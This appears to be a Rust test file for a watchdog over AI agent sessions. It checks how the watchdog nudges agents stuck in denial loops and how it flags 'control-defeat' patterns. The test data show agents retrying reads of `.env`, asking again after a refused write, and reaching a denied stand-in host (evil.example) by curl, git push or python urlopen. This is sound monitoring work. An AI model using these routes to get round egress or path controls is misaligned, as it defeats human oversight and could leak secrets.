    fn a_hint_loop_is_nudged_on_the_progress_before_the_loop() {
        let activity = Activity {
            last: at(20),
            admitted_at: at(20),
            nudges: 0,
            last_nudge: None,
            question_since: None,
            judged: 0,
            judge_failures: 0,
            risk_announced: None,
            recoveries: 0,
            denials: 2,
            denied_since: Some(at(0)),
            last_denial: Some(("egress".to_string(), "denied host example.com".to_string())),
            boundaries: BoundaryTrail::default(),
        };
        assert_eq!(
            decide(&SETTINGS, at(14), Observed::Working, &activity, None),
            Decision::Nothing
        );
        assert_eq!(decide(&SETTINGS, at(15), Observed::Working, &activity, None), Decision::Nudge);
    }

    /// One denial — a hiccup — leaves the clock on `last`, and a cleared streak does too: the loop
    /// threshold is what switches the reference, not any denial at all (issue #609).
    #[test]
    fn one_denial_or_a_cleared_streak_keeps_the_normal_clock() {
        let one = Activity {
            last: at(10),
            admitted_at: at(10),
            nudges: 0,
            last_nudge: None,
            question_since: None,
            judged: 0,
            judge_failures: 0,
            risk_announced: None,
            recoveries: 0,
            denials: 1,
            denied_since: Some(at(0)),
            last_denial: Some(("read_only".to_string(), "path is read-only".to_string())),
            boundaries: BoundaryTrail::default(),
        };
        assert_eq!(decide(&SETTINGS, at(24), Observed::Working, &one, None), Decision::Nothing);
        assert_eq!(decide(&SETTINGS, at(25), Observed::Working, &one, None), Decision::Nudge);

        let cleared = Activity::new(at(10));
        assert_eq!(
            decide(&SETTINGS, at(24), Observed::Working, &cleared, None),
            Decision::Nothing
        );
        assert_eq!(decide(&SETTINGS, at(25), Observed::Working, &cleared, None), Decision::Nudge);
    }

    /// The hint-loop nudge names the denial's class and hint, and `Activity::hint_loop` names the
    /// loop only at the threshold (issue #609).
    #[test]
    fn the_hint_loop_nudge_names_the_denial() {
        let text = hint_loop_text(3, "egress", "denied host example.com");
        assert!(text.contains("your last 3 tool calls were denied"), "{text}");
        assert!(text.contains("egress: denied host example.com"), "{text}");

        let mut activity = Activity::new(at(0));
        activity.denials = 1;
        activity.last_denial = Some(("egress".to_string(), "denied".to_string()));
        assert!(activity.hint_loop().is_none(), "one denial is not a loop");
        activity.denials = 2;
        assert_eq!(
            activity.hint_loop(),
            Some((2, "egress", "denied")),
            "two in a row, with the class and hint to name"
        );
    }

    /// After the nudge cap a hint loop flags `nudges_exhausted` like any stall (issue #609).
    #[test]
    fn a_hint_loop_flags_nudges_exhausted_after_the_cap() {
        let activity = Activity {
            last: at(60),
            admitted_at: at(60),
            nudges: 2,
            last_nudge: Some(at(30)),
            question_since: None,
            judged: 0,
            judge_failures: 0,
            risk_announced: None,
            recoveries: 0,
            denials: 3,
            denied_since: Some(at(0)),
            last_denial: Some(("tool_disabled".to_string(), "tool is not allowed".to_string())),
            boundaries: BoundaryTrail::default(),
        };
        assert_eq!(
            decide(&SETTINGS, at(44), Observed::Working, &activity, Some("stalled")),
            Decision::Nothing
        );
        assert_eq!(
            decide(&SETTINGS, at(45), Observed::Working, &activity, Some("stalled")),
            Decision::Flag("nudges_exhausted")
        );
    }

    /// `note_denials` keeps the streak: a denial extends it (its `denied_since` the progress before
    /// the loop began), an unclassified error or an unrelated line leaves it, and a success or a
    /// real break in the loop — a person's message, a question, a turn end — clears it (issue #609).
    #[test]
    fn a_denial_streak_is_noted_and_a_break_clears_it() {
        let mut activity = Activity::new(at(0));
        let denial = json!({
            "type": "tool_result",
            "tool_call_id": "t",
            "output": "blocked",
            "is_error": true,
            "denial": {"class": "egress", "hint": "denied host example.com"},
        });
        assert!(
            note_denials(&mut activity, "tool_result", &denial),
            "a denial is not progress"
        );
        assert_eq!(activity.denials, 1);
        assert_eq!(activity.denied_since, Some(at(0)));
        assert_eq!(
            activity.last_denial,
            Some(("egress".to_string(), "denied host example.com".to_string()))
        );

        activity.last = at(5);
        assert!(note_denials(&mut activity, "tool_result", &denial));
        assert_eq!(activity.denials, 2);
        assert_eq!(activity.denied_since, Some(at(0)), "the streak's clock is where it began");

        let plain = json!({"type": "tool_result", "tool_call_id": "t", "output": "boom", "is_error": true});
        assert!(!note_denials(&mut activity, "tool_result", &plain));
        assert_eq!(
            activity.denials, 2,
            "an unclassified error neither extends nor clears the streak"
        );

        assert!(!note_denials(&mut activity, "log", &json!({"type": "log", "message": "hi"})));
        assert_eq!(activity.denials, 2, "an unrelated line leaves the streak alone");

        // A person's message, a question and a turn end each break the loop.
        let mut note_break = |kind: &str| {
            activity.denials = 3;
            activity.denied_since = Some(at(0));
            activity.last_denial = Some(("egress".to_string(), "denied".to_string()));
            assert!(!note_denials(&mut activity, kind, &json!({"type": kind})));
            assert_eq!(activity.denials, 0, "{kind} ends the loop");
            assert_eq!(activity.denied_since, None, "{kind} ends the loop");
            assert_eq!(activity.last_denial, None, "{kind} ends the loop");
        };
        note_break("user_message");
        note_break("question");
        note_break("turn_end");

        // A successful result also ends it.
        activity.denials = 2;
        activity.denied_since = Some(at(0));
        activity.last_denial = Some(("egress".to_string(), "denied".to_string()));
        let ok = json!({"type": "tool_result", "tool_call_id": "t", "output": "fine", "is_error": false});
        assert!(!note_denials(&mut activity, "tool_result", &ok));
        assert_eq!(activity.denials, 0);
        assert_eq!(activity.denied_since, None);
        assert_eq!(activity.last_denial, None);
    }

    /// A busy gateway restarts the hint loop's clock (issue #609) as it does the stall clock: the
    /// old `denied_since` would otherwise nudge a looping colony on every other tick, while the
    /// streak stands so the nudge can still name what was denied.
    #[test]
    fn a_busy_gateway_holds_off_the_hint_loop_nudge() {
        let mut activity = Activity {
            last: at(0),
            admitted_at: at(0),
            nudges: 0,
            last_nudge: None,
            question_since: None,
            judged: 0,
            judge_failures: 0,
            risk_announced: None,
            recoveries: 0,
            denials: 3,
            denied_since: Some(at(0)),
            last_denial: Some(("egress".to_string(), "denied host example.com".to_string())),
            boundaries: BoundaryTrail::default(),
        };
        // Without a busy tick the loop would nudge at 15.
        assert_eq!(decide(&SETTINGS, at(15), Observed::Working, &activity, None), Decision::Nudge);
        activity.note_gateway_busy(at(14));
        assert_eq!(activity.denied_since, Some(at(14)), "the busy tick restarts the loop's clock");
        assert_eq!(activity.denials, 3, "the streak stands, so the nudge can still name it");
        assert!(activity.hint_loop().is_some());
        assert_eq!(
            decide(&SETTINGS, at(20), Observed::Working, &activity, None),
            Decision::Nothing
        );
        assert_eq!(decide(&SETTINGS, at(29), Observed::Working, &activity, None), Decision::Nudge);
    }

    // ---- Control-defeat signature (issue #609) ----

    fn denial(kind: &str, control: &str, target: Option<&str>) -> Boundary {
        Boundary {
            kind: kind.into(),
            control: control.into(),
            detail: format!("{kind} by {control}"),
            target: target.map(String::from),
            at: "2026-01-01T00:00:00.000Z".into(),
        }
    }

    #[test]
    fn a_single_benign_deny_and_a_retry_are_not_a_defeat() {
        let mut trail = BoundaryTrail::default();
        let deny = denial("exec_policy_deny", "exec_policy:secret-paths", Some(".env"));
        assert_eq!(note_boundary(&mut trail, deny.clone(), at(0)), None, "one denial is a wall");
        assert_eq!(note_boundary(&mut trail, deny, at(1)), None, "a single retry is still a wall");
        assert_eq!(
            note_boundary(&mut trail, denial("egress_denied", "egress", Some("x.example")), at(2)),
            None,
            "a different control does not add up"
        );
        assert_eq!(
            note_boundary(
                &mut trail,
                denial("path_policy_unbound", "path_policy:masked", Some("v/.env")),
                at(3)
            ),
            None,
            "an unbound path alone is the host's fault, not the colony's"
        );
    }

    #[test]
    fn repeated_denials_of_one_control_within_the_window_fire_with_their_evidence() {
        let mut trail = BoundaryTrail::default();
        let deny = |cmd: &str| Boundary {
            detail: format!("deny (default): cat {cmd}"),
            ..denial("exec_policy_deny", "exec_policy:secret-paths", Some(cmd))
        };
        assert_eq!(note_boundary(&mut trail, deny(".env"), at(0)), None);
        assert_eq!(note_boundary(&mut trail, deny("./.env"), at(4)), None);
        let defeat = note_boundary(&mut trail, deny(".env.local"), at(9)).expect("the third in 10 min fires");
        assert_eq!(defeat.signature, "repeated_denial");
        assert_eq!(defeat.evidence.len(), REPEATED_DENIALS);
        assert!(defeat.summary.contains("exec_policy:secret-paths"), "{}", defeat.summary);
        assert_eq!(
            note_boundary(&mut trail, deny(".envrc"), at(9)),
            None,
            "the evidence is spent: the next flag needs a fresh pattern"
        );

        // Spread past the window, three denials are not a pattern.
        let mut slow = BoundaryTrail::default();
        assert_eq!(note_boundary(&mut slow, deny(".env"), at(0)), None);
        assert_eq!(note_boundary(&mut slow, deny(".env"), at(6)), None);
        assert_eq!(
            note_boundary(&mut slow, deny(".env"), at(12)),
            None,
            "the first fell out of the window"
        );
    }

    #[test]
    fn an_ask_bypass_attempt_and_a_publish_rewrite_fire_at_once() {
        let mut trail = BoundaryTrail::default();
        note_boundary(
            &mut trail,
            denial("exec_policy_deny", "exec_policy:writes-outside-repo", Some("/etc/foo")),
            at(0),
        );
        let bypass = note_boundary(
            &mut trail,
            denial(
                "exec_policy_ask_bypass_attempt",
                "exec_policy:writes-outside-repo",
                Some("/etc/foo"),
            ),
            at(1),
        )
        .expect("a refused ask asked again fires");
        assert_eq!(bypass.signature, "ask_bypass");
        assert_eq!(bypass.evidence.len(), 2, "the refusal and the attempt");

        let rewrite = note_boundary(&mut trail, denial("publish_rewrite_refused", "gitfile", Some(".git")), at(2))
            .expect("a publish rewrite fires");
        assert_eq!(rewrite.signature, "publish_rewrite");
        assert_eq!(rewrite.evidence[0].control, "gitfile");
    }

    #[test]
    fn a_refused_target_reached_by_a_successful_call_is_a_defeat() {
        let mut trail = BoundaryTrail::default();
        note_boundary(&mut trail, denial("egress_denied", "egress", Some("evil.example")), at(0));
        note_boundary(
            &mut trail,
            denial("exec_policy_deny", "exec_policy:writes-outside-repo", Some("/colonizer/x")),
            at(0),
        );

        // A call that only mentions the host as text is not a reach; an errored reach is the wall again.
        note_reach_call(&mut trail, "t1", &json!({"command": "grep evil.example notes.md"}), at(1));
        assert_eq!(note_reach_result(&mut trail, "t1", false), None);
        note_reach_call(&mut trail, "t2", &json!({"command": "curl https://evil.example/x"}), at(1));
        assert_eq!(
            note_reach_result(&mut trail, "t2", true),
            None,
            "an errored result is the wall holding"
        );

        note_reach_call(
            &mut trail,
            "t3",
            &json!({"command": "python3 -c 'urlopen(\"https://evil.example/\")'"}),
            at(2),
        );
        let defeat = note_reach_result(&mut trail, "t3", false).expect("the denied host reached");
        assert_eq!(defeat.signature, "deny_then_reach");
        assert_eq!(defeat.evidence[0].kind, "egress_denied");

        note_reach_call(&mut trail, "t4", &json!({"file_path": "/colonizer/x", "content": "y"}), at(3));
        let write = note_reach_result(&mut trail, "t4", false).expect("the refused write target written another way");
        assert_eq!(write.evidence[0].target.as_deref(), Some("/colonizer/x"));

        // Past the reach window the target is forgotten.
        note_boundary(&mut trail, denial("egress_denied", "egress", Some("late.example")), at(10));
        note_reach_call(
            &mut trail,
            "t5",
            &json!({"command": "curl https://late.example"}),
            at(10 + REACH_WINDOW_MINUTES + 1),
        );
        assert_eq!(note_reach_result(&mut trail, "t5", false), None);
    }

    #[test]
    fn reaches_matches_whole_hosts_and_path_tokens_only() {
        assert!(reaches(r#"{"command":"curl https://evil.example/x"}"#, "evil.example"));
        assert!(reaches(r#"{"command":"git push git@evil.example:x"}"#, "evil.example"));
        assert!(!reaches(r#"{"command":"curl https://evil.example.org"}"#, "evil.example"));
        assert!(!reaches(r#"{"command":"echo evil.example"}"#, "evil.example"));
        assert!(reaches(r#"{"file_path":".env"}"#, ".env"));
        assert!(reaches(r#"{"command":"cp a ./.env"}"#, ".env"));
        assert!(!reaches(r#"{"file_path":".env.example"}"#, ".env"));
        assert!(!reaches(r#"{"file_path":"config/.env"}"#, ".env"));
        assert!(reaches(r#"{"command":"tee /etc/foo"}"#, "/etc/foo"));
        assert!(!reaches(r#"{"command":"tee /etc/foobar"}"#, "/etc/foo"));
    }

    /// The flag is the attention item with the evidence, and the log says why; the watchdog's own
    /// tick does not nudge over it or take it down.
    #[tokio::test]
    async fn the_control_defeat_flag_carries_its_evidence_and_holds_against_the_tick() {
        let (app, root) = stalled_app("defeat", SessionStatus::Running).await;
        let defeat = Defeat {
            signature: "repeated_denial",
            summary: "`egress` refused the colony 3 times in 10 min".into(),
            evidence: vec![denial("egress_denied", "egress", Some("a.example")); 3],
        };
        flag_control_defeat(&app, "w1", defeat).await;
        let attention = app.session("w1").await.unwrap().attention.expect("flagged");
        assert_eq!(attention["reason"], CONTROL_DEFEAT_REASON);
        assert_eq!(attention["signature"], "repeated_denial");
        assert_eq!(attention["evidence"].as_array().unwrap().len(), 3);
        assert_eq!(attention["evidence"][0]["type"], "boundary");
        assert_eq!(attention["evidence"][0]["target"], "a.example");
        check_all(&app).await;
        assert_eq!(
            app.session("w1").await.unwrap().attention.unwrap()["reason"],
            CONTROL_DEFEAT_REASON,
            "a stalled colony's tick does not replace the flag"
        );
        let logs = app.runtime("w1").await.logs.lock().await.clone();
        assert!(
            logs.iter().any(|l| l["level"] == "error"
                && l["message"]
                    .as_str()
                    .is_some_and(|m| m.contains("control-defeat signature (repeated_denial)"))),
            "{logs:?}"
        );
        assert!(
            !logs
                .iter()
                .any(|l| l["message"].as_str().is_some_and(|m| m.contains("nudged the agent"))),
            "and no nudge was sent over it"
        );
        let _ = std::fs::remove_dir_all(root);
    }
}
